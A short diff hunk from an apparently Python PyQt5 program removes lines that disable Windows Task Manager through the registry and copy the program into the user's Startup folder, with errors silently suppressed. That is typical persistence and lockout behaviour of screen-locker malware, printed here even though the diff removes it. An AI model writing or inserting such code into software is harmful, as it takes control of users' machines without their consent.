@@ -3,13 +3,6 @@ warnings.filterwarnings('ignore')
 from PyQt5.QtWidgets import*
 from PyQt5.QtCore import*
 from PyQt5.QtGui import*
-s=os.path.join(os.environ['APPDATA'],'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-try:winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,winreg.KEY_SET_VALUE),"DisableTaskMgr",0,winreg.REG_DWORD,1)
-except:pass
-try:winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",0,winreg.KEY_SET_VALUE),"DisableTaskMgr",0,winreg.REG_DWORD,1)
-except:pass
-try:os.makedirs(s)if not os.path.exists(s)else None;t=os.path.join(s,os.path.basename(sys.executable if getattr(sys,'frozen',False)else __file__));shutil.copy(sys.executable if getattr(sys,'frozen',False)else __file__,t)if not os.path.exists(t)else None
-except:pass
 class R(QMainWindow):
     def __init__(s):
         super().__init__()
